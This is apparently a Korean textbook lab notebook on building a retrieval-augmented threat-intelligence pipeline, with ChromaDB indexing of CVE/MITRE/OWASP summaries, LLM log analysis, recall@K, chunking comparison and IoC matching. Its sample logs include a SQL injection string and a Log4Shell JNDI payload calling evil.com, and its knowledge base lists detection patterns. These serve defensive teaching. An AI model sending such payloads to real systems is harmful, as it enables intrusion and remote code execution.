# Chapter 18 — RAG와 위협 인텔리전스 (실습)

## 실습 목표
1. ChromaDB 셋업
2. 합성 보안 KB 15건 인덱싱 (CVE/MITRE/OWASP)
3. sentence-transformers 임베딩
4. 의심 로그 → RAG → LLM 분석
5. recall@K 측정

In [ ]:
# 파트별 노트북은 같은 종류의 공통 데이터·모델 작업 폴더를 사용합니다.
from pathlib import Path as _BookPath
import os as _book_os
_book_cwd = _BookPath.cwd()
if (_book_cwd.name in {"part1", "part2", "part3", "part4"}
        and _book_cwd.parent.name in {"instructor", "exercises", "solutions"}):
    _book_os.chdir(_book_cwd.parent)


In [ ]:
# 첫 사용시에만 주석 해제하여 실행 (Colab/venv 환경에 따라 일부는 이미 설치됨)
# !pip install -q anthropic
# !pip install -q chromadb
# !pip install -q sentence-transformers
# !pip install -q pandas

In [ ]:
import os, json, re
import pandas as pd
import chromadb
from chromadb.utils import embedding_functions
# --- API 키 로드: 환경변수 → 루트 .env → Colab Secrets → getpass (없으면 mock 자동) ---
LLM_MODE = os.environ.get('BOOK_LLM_MODE', 'auto')
if LLM_MODE != 'mock':
    if not os.environ.get('ANTHROPIC_API_KEY'):
        from pathlib import Path as _P
        for _d in [_P.cwd(), *_P.cwd().parents]:
            _e = _d / '.env'
            if _e.exists():
                for _l in _e.read_text(encoding='utf-8').splitlines():
                    if _l.strip().startswith('ANTHROPIC_API_KEY='):
                        os.environ['ANTHROPIC_API_KEY'] = _l.split('=', 1)[1].strip().strip('"').strip("'")
                break
        if not os.environ.get('ANTHROPIC_API_KEY'):
            try:
                from google.colab import userdata
                os.environ['ANTHROPIC_API_KEY'] = userdata.get('ANTHROPIC_API_KEY')
            except Exception:
                pass
        if not os.environ.get('ANTHROPIC_API_KEY'):
            try:  # 대화형(Jupyter/Colab)에서만 입력받는다. Enter 만 치면 mock 으로 진행.
                import getpass
                os.environ['ANTHROPIC_API_KEY'] = getpass.getpass('ANTHROPIC_API_KEY (Enter=mock): ') or ''
            except Exception:
                pass
API_KEY = os.environ.get('ANTHROPIC_API_KEY') if LLM_MODE != 'mock' else None
USE_REAL = bool(API_KEY)
if USE_REAL:
    import anthropic
    llm = anthropic.Anthropic(api_key=API_KEY, max_retries=0)

In [ ]:
# === 한글 폰트 설정 (matplotlib) ===
# 그래프에서 한글이 깨지면(사각형 □) 아래 설치 명령의 주석을 1회 해제해 실행한 뒤 런타임을 재시작한다.
#   Colab / Ubuntu:  !apt-get install -y fonts-noto-cjk fonts-nanum > /dev/null 2>&1
#   pip 대안       :  !pip install koreanize-matplotlib -q   →   import koreanize_matplotlib
# Windows(맑은 고딕)·macOS(Apple SD Gothic)는 대개 한글 폰트가 기본 설치돼 있어 추가 설치가 필요 없다.
import os
import matplotlib
from matplotlib import font_manager

# OS별로 설치돼 있을 만한 한글 폰트 파일을 모두 등록 시도한다(Noto·나눔·맑은고딕·굴림·Apple 등).
for _fp in [
    # Linux
    '/usr/share/fonts/opentype/noto/NotoSansCJK-Regular.ttc',
    '/usr/share/fonts/truetype/nanum/NanumGothic.ttf',
    '/usr/share/fonts/truetype/nanum/NanumBarunGothic.ttf',
    # Windows
    'C:/Windows/Fonts/malgun.ttf', 'C:/Windows/Fonts/malgunbd.ttf',
    'C:/Windows/Fonts/gulim.ttc', 'C:/Windows/Fonts/batang.ttc',
    # macOS
    '/System/Library/Fonts/AppleSDGothicNeo.ttc',
    '/System/Library/Fonts/Supplemental/AppleGothic.ttf',
    '/Library/Fonts/AppleGothic.ttf',
]:
    if os.path.exists(_fp):
        try:
            font_manager.fontManager.addfont(_fp)
        except Exception:
            pass

# 등록된 폰트 중 사용 가능한 한글 폰트를 우선순위대로 선택한다.
_avail = {f.name for f in font_manager.fontManager.ttflist}
for _name in ['Malgun Gothic', '맑은 고딕', 'NanumGothic', 'Noto Sans CJK KR', 'Noto Sans KR',
              'Apple SD Gothic Neo', 'AppleGothic', 'NanumBarunGothic', 'Gulim', 'Batang',
              'Noto Sans CJK JP']:
    if _name in _avail:
        matplotlib.rcParams['font.family'] = _name
        break
matplotlib.rcParams['axes.unicode_minus'] = False  # 한글 폰트에서 마이너스 기호 깨짐 방지


---
## Step 1. ChromaDB + 임베딩 함수

In [ ]:
client = chromadb.PersistentClient(path='data/chroma')
ef = embedding_functions.SentenceTransformerEmbeddingFunction(
    model_name='all-MiniLM-L6-v2'
)
col = client.get_or_create_collection(name='security_kb', embedding_function=ef, metadata={'hnsw:space':'cosine'})
print('ChromaDB collection ready')


---
## Step 2. 합성 보안 KB 15건 인덱싱

In [ ]:
kb = [
    # CVE (영향 버전 / 탐지 힌트 / 대응 을 함께 담아 검색·인용 가치를 높인다)
    ('CVE-2021-44228', 'Log4Shell: Log4j2 JNDI 원격코드실행. 영향: Log4j 2.0-2.14.1. 탐지: 요청·헤더의 ${jndi:ldap|rmi|dns} 패턴, 비정상 아웃바운드 LDAP. 대응: 2.17.1+ 업그레이드', {'cvss':10.0,'kind':'cve'}),
    ('CVE-2023-34362', 'MOVEit Transfer SQL 인젝션 0-day(Cl0p 대량 유출). 영향: MOVEit Transfer <15.0.1. 탐지: human2.aspx 웹셸 생성, 비정상 다운로드. 대응: 벤더 패치', {'cvss':9.8,'kind':'cve'}),
    ('CVE-2024-3094',  'XZ Utils 백도어 공급망 침해. 영향: xz 5.6.0-5.6.1. 탐지: 해당 버전 존재, sshd 인증 비정상 지연. 대응: 5.4.x 다운그레이드', {'cvss':10.0,'kind':'cve'}),
    ('CVE-2023-44487', 'HTTP/2 Rapid Reset DoS. 탐지: HEADERS 직후 RST_STREAM 대량 반복. 대응: HTTP/2 동시 스트림 제한·패치', {'cvss':7.5,'kind':'cve'}),
    # MITRE ATT&CK
    ('T1190', 'Exploit Public-Facing Application: 공개 서비스 취약점 악용. 탐지: 알려진 익스플로잇 페이로드, 4xx/5xx 급증. 대응: 패치·WAF', {'kind':'mitre'}),
    ('T1566', 'Phishing: 메시지로 초기 접근. 탐지: 의심 첨부·링크, 신규 발신 도메인. 대응: 메일 필터·사용자 교육', {'kind':'mitre'}),
    ('T1071', 'Application Layer Protocol(C2): HTTPS·DNS로 명령제어. 탐지: 주기적 비콘, 비정상 DNS TXT. 대응: 이그레스 필터·프록시 검사', {'kind':'mitre'}),
    ('T1078', 'Valid Accounts: 유효 계정 악용. 탐지: impossible travel, 비정상 시간대 로그인. 대응: MFA·이상행위 탐지', {'kind':'mitre'}),
    ('T1110', 'Brute Force: 암호·키 추측. 탐지: 짧은 시간 다수 인증 실패. 대응: 계정 잠금·rate limit·MFA', {'kind':'mitre'}),
    ('T1059', 'Command and Scripting Interpreter: 셸로 명령 실행. 탐지: 웹서버의 비정상 자식 프로세스(sh/powershell). 대응: 실행 제한·EDR', {'kind':'mitre'}),
    # OWASP Top 10
    ('A01:2021', 'Broken Access Control: 권한 통제 미흡. 탐지: 수평·수직 권한상승, IDOR. 대응: 서버측 권한 검증', {'kind':'owasp'}),
    ('A03:2021', 'Injection: SQL/NoSQL/OS/LDAP 인젝션. 탐지: \' OR 1=1, UNION SELECT, 특수문자 삽입. 대응: 파라미터 바인딩·입력 검증', {'kind':'owasp'}),
    ('A07:2021', 'Identification and Authentication Failures: 약한 인증. 탐지: 크리덴셜 스터핑, 세션 고정. 대응: MFA·세션 관리 강화', {'kind':'owasp'}),
    ('A04:2021', 'Insecure Design: 설계 단계 결함. 탐지: 비즈니스 로직 악용. 대응: 위협 모델링·보안 설계', {'kind':'owasp'}),
    ('A05:2021', 'Security Misconfiguration: 기본 설정·불필요 포트 노출. 탐지: 기본 크리덴셜, 노출된 관리 페이지. 대응: 하드닝·최소권한', {'kind':'owasp'}),
]

col.upsert(
    documents=[f'{i} {d}' for i, d, _ in kb],
    ids=[i for i, _, _ in kb],
    metadatas=[m | {'id': i} for i, _, m in kb],
)
print(f'{col.count()} 건 인덱싱 완료')


---
## Step 3. 검색 — 의심 로그를 query 로

In [ ]:
test_logs = [
    {'src':'1.2.3.4','url':"/login?id=' OR 1=1--",'desc':'SQL injection attempt'},
    {'src':'5.6.7.8','url':'/login','desc':'brute force 50 attempts in 1 min'},
    {'src':'9.10.11.12','url':'/api/v1/${jndi:ldap://evil.com/a}','desc':'Log4Shell-style request'},
]
for log in test_logs:
    res = col.query(query_texts=[log['desc']], n_results=3)
    print(f"\n=== {log['desc']} ===")
    for doc, meta in zip(res['documents'][0], res['metadatas'][0]):
        print(f"  [{meta['id']}] ({meta['kind']}) {doc[:80]}")


---
## Step 4. RAG → LLM 분석

In [ ]:
# ── 실습 과제 ──
# 목표: Step 4. RAG → LLM 분석
# 만들 결과: rag_analyze(), unknown, query, hits, ctx, resp
# 산출: 결과 값 출력
# 아래에 직접 구현하세요. 막히면 다음 셀의 '힌트 보기'(구조 스켈레톤)를 참고합니다.

<details><summary>💡 <b>힌트 보기</b> (막혔을 때만)</summary>

> 정답이 아닌 **구조 스켈레톤**입니다. 변수명·제어흐름·주석만 노출되고 실제 값/로직은 `...` 로 가려둠.

```python
def rag_analyze(log: ...
    unknown = ...
               ...
    try:
        if col.count() == 0:
            return ...
        query = ...
        hits = ...
        ids, docs = ...
        ctx = ...
        if USE_REAL:
            resp = ...
                model = ...
                system = ...
                        ...
                messages = ...
            if resp.stop_reason != 'end_turn':
                return ...
            analysis = ...
        else:
            analysis = ...
        citations = ...
        valid = ...
        return ...
                ...
    except Exception as exc:
        return ...

for log in test_logs:
    r = ...
    ...
```
</details>


---
## Step 5. Recall@K 측정

In [ ]:
# ── 실습 과제 ──
# 목표: Step 5. Recall@K 측정
# 만들 결과: eval_set, recall_at_k(), recalls, res, retrieved, recall_by_k
# 산출: 결과 값 출력
# 아래에 직접 구현하세요. 막히면 다음 셀의 '힌트 보기'(구조 스켈레톤)를 참고합니다.

<details><summary>💡 <b>힌트 보기</b> (막혔을 때만)</summary>

> 정답이 아닌 **구조 스켈레톤**입니다. 변수명·제어흐름·주석만 노출되고 실제 값/로직은 `...` 로 가려둠.

```python
# (로그, 정답 id) 페어 — 명확한 케이스 + 모호/노이즈 케이스(일부러 top-K 밖일 수 있음)
eval_set = ...
    ...

def recall_at_k(k):
    recalls = ...
    for log, truths in eval_set:
        res = ...
        retrieved = ...
        ...
    return ...

recall_by_k = ...
for k, r in recall_by_k.items():
    print(f'Recall@{k} = ...

...
for log, truths in eval_set:
    res = ...
    retrieved = ...
    print(f"{log['desc'][:34]:34s} retrieved = ...
```
</details>


In [ ]:
# Recall@K 곡선 시각화
import matplotlib.pyplot as plt
ks = list(recall_by_k.keys()); vs = [recall_by_k[k]*100 for k in ks]
fig, ax = plt.subplots(figsize=(6, 3.5))
ax.plot(ks, vs, marker='o', color='#1a5f7a')
ax.set_title('Recall@K (검색기 성능)')
ax.set_xlabel('K'); ax.set_ylabel('Recall (%)')
ax.set_xticks(ks); ax.set_ylim(0, 105); ax.grid(alpha=0.3)
plt.tight_layout(); plt.show()

---
## Step 6. Chunking 전략 비교 — 긴 사고 보고서를 어떻게 자를까

앞 단계의 KB 는 항목 하나가 한두 문장이라 자를 필요가 없었다. 실제 위협 인텔리전스는
**수십 쪽짜리 사고 보고서**가 많고, 이를 어떻게 자르느냐(chunking)에 따라 검색 결과가 달라진다.
본문 §18.2 의 세 전략을 같은 보고서에 적용해 비교한다.

- **고정 길이** — N 글자마다 기계적으로 자른다
- **고정 길이 + 겹침** — 경계에서 잘린 내용을 살리려고 앞 청크와 일부를 겹친다
- **문단 단위** — 의미 단위인 문단 경계에서 자른다

보고서가 한국어이므로 **다국어 임베딩 모델**을 쓴다. 앞 단계의 `all-MiniLM-L6-v2` 는 영어 전용이라,
같은 실험을 그 모델로 돌리면 세 전략 모두 한국어 질의를 거의 찾지 못한다(본문 §18.3.2).

In [ ]:
import re
ef_multi = embedding_functions.SentenceTransformerEmbeddingFunction(
    model_name='paraphrase-multilingual-MiniLM-L12-v2'   # 한국어 지원 다국어 모델
)

report = """사고 개요. 2025년 3월 12일 새벽 사내 결제 서버에서 비정상 아웃바운드 트래픽이 탐지되었다. 초기 경보는 SIEM 의 야간 대량 전송 규칙에서 발생했다.

초기 침투. 공격자는 인터넷에 노출된 VPN 장비의 인증 우회 취약점 CVE-2023-46805와 명령 주입 취약점 CVE-2024-21887 을 이용해 내부망에 들어왔다. 해당 장비는 패치가 석 달째 미적용 상태였다.

권한 상승. 침투 후 공격자는 도메인 컨트롤러에서 Kerberoasting 으로 서비스 계정 해시를 탈취했다. 크래킹된 계정은 svc_backup 이었다.

내부 확산. 공격자는 PsExec 을 이용해 파일 서버 fs-02 와 결제 서버 pay-01 로 수평 이동했다. 이동은 업무 시간 외인 새벽 2시에서 4시 사이에 집중되었다.

명령 제어. 감염 호스트는 cdn-update-check.net 도메인으로 60초 주기의 HTTPS 비컨을 보냈다. 변동계수는 0.02 로 매우 규칙적이었다.

유출. 공격자는 고객 결제 데이터 약 4.2GB 를 압축해 DNS 터널링으로 외부에 전송했다. 전송은 3일에 걸쳐 분산되었다.

대응. 보안팀은 VPN 장비를 격리하고 svc_backup 계정을 비활성화했으며 C2 도메인을 DNS 싱크홀 처리했다."""

# (질문, 검색된 청크에 반드시 들어 있어야 할 정답 문자열)
questions = [
    ('초기 침투에 사용된 취약점은?',     'CVE-2024-21887'),
    ('탈취된 서비스 계정 이름은?',       'svc_backup'),
    ('C2 통신 도메인은?',                'cdn-update-check.net'),
    ('데이터를 어떤 방식으로 유출했나?',  'DNS 터널링'),
    ('수평 이동에 쓴 도구는?',           'PsExec'),
]

# ── 실습 과제 ──
# 목표: Step 6. Chunking 전략 비교 — 긴 사고 보고서를 어떻게 자를까 — 앞 단계의 KB 는 항목 하나가 한두 문장이라 자를 필요가 없었다. 실제 위협 인텔리전스는
# 만들 결과: chunk_fixed(), t, step, chunk_paragraph(), strategies, rows
# 아래에 직접 구현하세요. 막히면 다음 셀의 '힌트 보기'(구조 스켈레톤)를 참고합니다.

chunk_result = pd.DataFrame(rows)
chunk_result

<details><summary>💡 <b>힌트 보기</b> (막혔을 때만)</summary>

> 정답이 아닌 **구조 스켈레톤**입니다. 변수명·제어흐름·주석만 노출되고 실제 값/로직은 `...` 로 가려둠.

```python
def chunk_fixed(text, size, overlap=0):
    t = ...
    step = ...
    return ...

def chunk_paragraph(text):
    return ...

strategies = ...
    ...

rows = ...
for cid, label, chunks in strategies:
    c = ...
    c.upsert(documents = ...
    marks = ...
    for q, answer in questions:
        top1 = ...
        ...
```
</details>


In [ ]:
# 고정 길이로 자르면 정답 문자열이 청크 경계에서 쪼개지는지 확인
fixed_chunks = chunk_fixed(report, 100)
for _, answer in questions:
    intact = any(answer in ch for ch in fixed_chunks)
    print(f'{answer:<22} 고정 100자 청크 안에 온전히 존재: {intact}')

## 보완 실습. 해시 IoC 정확 대조

18.5.4절과 같은 합성 목록입니다. 실제 악성 해시·공개 피드 결과가 아닙니다. 일치와 침해 확정을 구별합니다.

**확인 과제**

1. 대문자·길이가 잘못된 해시·누락 값을 각각 입력합니다.
2. `certificate_sha256` 합성 항목을 추가해 정확한 일치만 반환하는지 확인합니다.
3. 일치·불일치 모두 UNKNOWN인 이유와 감염 판단에 필요한 자산·행위 근거를 적습니다.

In [ ]:
import re

# 실제 악성 해시가 아닌 교육용 목록입니다.
ioc_records = [{'kind': 'ja3', 'value': 'a' * 32,
                'source': '교육용 합성 IoC', 'note': '추가 조사 대상'}]

def match_hash_ioc(log, records):
    matches = []
    for row in records:
        kind = row.get('kind')
        length = {'ja3': 32, 'certificate_sha256': 64}.get(kind)
        observed = str(log.get(kind, '')).lower()
        expected = str(row.get('value', '')).lower()
        if (length and re.fullmatch('[0-9a-f]{' + str(length) + '}', observed)
                and observed == expected):
            matches.append(dict(row))
    return {'matches': matches, 'requires_review': bool(matches),
            'verdict': 'UNKNOWN'}

matched = match_hash_ioc({'ja3': 'a' * 32}, ioc_records)
unmatched = match_hash_ioc({'ja3': 'b' * 32}, ioc_records)
assert matched['requires_review'] and not unmatched['requires_review']
assert matched['verdict'] == unmatched['verdict'] == 'UNKNOWN'
print(matched)


---
## 정리
- ChromaDB와 sentence-transformers로 검색·생성 흐름을 구성했다.
- 답변의 인용 ID를 검색 결과와 대조하되, 근거 내용의 일치는 별도로 검토한다.
- Recall@K로 검색 성능을 측정하고 청크 분할 방식을 비교했다.
- 다음 ch19에서는 도구 호출과 승인 절차를 모의 실행한다.